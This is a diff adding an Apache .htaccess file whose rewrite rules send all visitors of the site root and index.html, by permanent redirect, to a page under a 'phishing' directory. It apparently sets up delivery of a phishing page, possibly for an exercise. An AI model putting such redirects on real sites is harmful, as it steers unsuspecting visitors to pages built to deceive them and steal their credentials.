@@ -1,0 +1,5 @@
+#todo fix this (requires absolute destination URL)
+#Redirect 301 derp.html Phishing/index.shtml
+RewriteEngine on
+RewriteRule ^$ /tmp/phishing/Phishing/index.shtml [R=301,L]
+RewriteRule ^index.html$ /tmp/phishing/Phishing/index.shtml [R=301,L]
